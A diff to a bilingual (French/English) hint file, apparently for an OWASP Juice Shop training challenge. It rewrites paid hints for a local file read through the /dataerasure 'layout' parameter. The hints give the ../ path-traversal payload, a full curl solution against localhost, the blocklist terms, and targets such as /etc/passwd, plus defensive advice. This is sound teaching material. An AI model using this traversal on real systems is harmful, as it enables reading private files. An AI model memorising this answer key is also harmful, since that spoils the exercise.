@@ -69,136 +69,57 @@ hints:
   N4:
     cost_pct: 35
     text_fr: |
-      Source serveur verifiee
-      (routes/dataErasure.ts:68-82) : (a) le
-      `layout` parametre body est passe a
-      `path.resolve()` puis check `isForbiddenFile`
-      via 3 substring blocklist (`ftp`, `ctf.key`,
-      `encryptionkeys`). (b) Si le check passe,
-      `res.render('dataErasureResult', { ...
-      req.body })` est appele. (c) Le solveIf est
-      `() => { return true }` declenche quand le
-      callback render() reussit avec html
-      non-empty. (d) Donc target paths possibles :
-      `package.json`, `server.ts`, `routes/login.ts`,
-      ABSOLUTE paths comme `/etc/passwd` (Linux) ou
-      `C:/Windows/win.ini` (Windows).
+      Le moteur de vues est Handlebars (hbs) et le parametre layout de
+      /dataerasure est resolu en chemin de fichier
+      (routes/dataErasure.ts) : il sert de gabarit et son contenu est
+      renvoye (tronque). Seule une blocklist de sous-chaines bloque ftp,
+      ctf.key et encryptionkeys. Le chemin est relatif au dossier des
+      vues, il faut donc remonter avec ../ pour lire un fichier du
+      projet. L'authentification se fait par le COOKIE de session.
     text_en: |
-      Verified server
-      source (routes/dataErasure.ts:68-82): (a)
-      `layout` body parameter passed to
-      `path.resolve()` then `isForbiddenFile` check
-      via 3 substring blocklist (`ftp`, `ctf.key`,
-      `encryptionkeys`). (b) If check passes,
-      `res.render('dataErasureResult', { ...
-      req.body })` called. (c) solveIf is `() => {
-      return true }` triggered when render()
-      callback succeeds with non-empty html. (d) So
-      possible target paths: `package.json`,
-      `server.ts`, `routes/login.ts`, ABSOLUTE
-      paths like `/etc/passwd` (Linux) or
-      `C:/Windows/win.ini` (Windows).
+      The view engine is Handlebars (hbs) and the /dataerasure layout
+      parameter is resolved to a file path (routes/dataErasure.ts): it
+      is used as a template and its content is returned (truncated).
+      Only a substring blocklist blocks ftp, ctf.key and encryptionkeys.
+      The path is relative to the views folder, so you must go up with
+      ../ to read a project file. Authentication uses the session
+      COOKIE.
     pedagogical_intent: |
-      Reveal exact code path + targets.
+      Give the real mechanism: hbs layout path, ../ traversal, cookie auth.
 
   N5:
     cost_pct: 50
     text_fr: |
-      Workflow complet :
-      1. Login Juice Shop (need authenticated user
-         pour /dataerasure).
-      2. Construire le POST body :
-         ```json
-         {
-           "email": "test@juice-sh.op",
-           "securityAnswer": "test",
-           "layout": "package.json"
-         }
-         ```
-         (Aussi essayer "/etc/passwd" sur Linux
-         deployment.)
-      3. POST /dataerasure avec ce body via curl/
-         Burp :
-         `curl -X POST http://localhost:3000/
-         dataerasure -H "Content-Type: application/
-         x-www-form-urlencoded" -H "Cookie: token=
-         <jwt>" -d "email=...&securityAnswer=...&
-         layout=package.json"`.
-      4. Le serveur :
-         (a) `path.resolve("package.json")` ->
-             `/app/package.json` (ne match aucun
-             forbidden : pas de "ftp", "ctf.key",
-             "encryptionkeys"),
-         (b) `res.render("package.json", ...)` ->
-             pug essaie de compiler package.json
-             comme template (failure partial mais
-             produit du html),
-         (c) le callback render() recupere
-             `html.slice(0, 100) + '......'`,
-         (d) `res.send(sendlfrResponse)` envoie
-             les 100 premiers chars,
-         (e) solveIf(true) -> challenge solve auto.
-      5. Tu vois le content de package.json
-         partiellement dans la response = LFR
-         confirme.
-      Source canonique : routes/dataErasure.ts:
-      68-82 + pug template engine + Snyk LFR
-      advisory.
-      Defense canonique : (a) ALLOWLIST des
-      templates autorises au lieu de blocklist, (b)
-      ne PAS passer user-controlled input a res.
-      render(), (c) si necessaire, resolver le
-      template name via une map { aliasUser ->
-      templateInternal }, (d) audit endpoints
-      forgotten (less-trafficked = less-tested).
+      Solution (verifiee en recette sur Juice Shop 19.2.1) : connecte
+      (le token doit etre envoye en cookie), POST sur /dataerasure avec
+      un layout qui remonte vers un fichier du projet :
+        curl -s -X POST http://127.0.0.1:3000/dataerasure \\
+          -b "token=<ton_jwt>" \\
+          -H "Content-Type: application/json" \\
+          -d '{"email":"<ton_email>","securityAnswer":"x","layout":"../package.json"}'
+      La reponse contient le debut de package.json (tronque a 100
+      caracteres + "......") : c'est la lecture de fichier arbitraire,
+      le challenge est resolu (dataErasure.ts). ftp/ctf.key/
+      encryptionkeys sont bloques par la blocklist ; un chemin sans ../
+      echoue (cherche dans le dossier des vues -> 500).
+      Defense : ne jamais construire un chemin de gabarit a partir
+      d'une entree utilisateur ; canoniser et restreindre a un
+      repertoire de vues fixe.
     text_en: |
-      Full workflow:
-      1. Login Juice Shop (need authenticated user
-         for /dataerasure).
-      2. Build POST body:
-         ```json
-         {
-           "email": "test@juice-sh.op",
-           "securityAnswer": "test",
-           "layout": "package.json"
-         }
-         ```
-         (Also try "/etc/passwd" on Linux
-         deployment.)
-      3. POST /dataerasure with this body via
-         curl/Burp:
-         `curl -X POST http://localhost:3000/
-         dataerasure -H "Content-Type: application/
-         x-www-form-urlencoded" -H "Cookie: token=
-         <jwt>" -d "email=...&securityAnswer=...&
-         layout=package.json"`.
-      4. Server:
-         (a) `path.resolve("package.json")` ->
-             `/app/package.json` (matches no
-             forbidden: no "ftp", "ctf.key",
-             "encryptionkeys"),
-         (b) `res.render("package.json", ...)` ->
-             pug tries to compile package.json as
-             template (partial failure but produces
-             html),
-         (c) render() callback retrieves
-             `html.slice(0, 100) + '......'`,
-         (d) `res.send(sendlfrResponse)` sends
-             first 100 chars,
-         (e) solveIf(true) -> challenge auto
-             solves.
-      5. You see package.json content partially
-         in response = LFR confirmed.
-      Canonical source: routes/dataErasure.ts:
-      68-82 + pug template engine + Snyk LFR
-      advisory.
-      Canonical defense: (a) ALLOWLIST of
-      authorized templates instead of blocklist,
-      (b) DON'T pass user-controlled input to res.
-      render(), (c) if needed, resolve template
-      name via map { aliasUser -> internalTemplate
-      }, (d) audit forgotten endpoints
-      (less-trafficked = less-tested).
+      Solution (verified during testing on Juice Shop 19.2.1): logged
+      in (the token must be sent as a cookie), POST to /dataerasure with
+      a layout going up to a project file:
+        curl -s -X POST http://127.0.0.1:3000/dataerasure \\
+          -b "token=<your_jwt>" \\
+          -H "Content-Type: application/json" \\
+          -d '{"email":"<your_email>","securityAnswer":"x","layout":"../package.json"}'
+      The response contains the start of package.json (truncated to 100
+      characters + "......"): that is the arbitrary file read, the
+      challenge solves (dataErasure.ts). ftp/ctf.key/encryptionkeys are
+      blocked by the blocklist; a path without ../ fails (looked up in
+      the views folder -> 500).
+      Defense: never build a template path from user input; canonicalize
+      and restrict to a fixed views directory.
     pedagogical_intent: |
-      Quasi-solution : workflow + curl + targets +
-      defense.
+      Full verified solution: exact payload (../package.json), cookie
+      auth, defense.
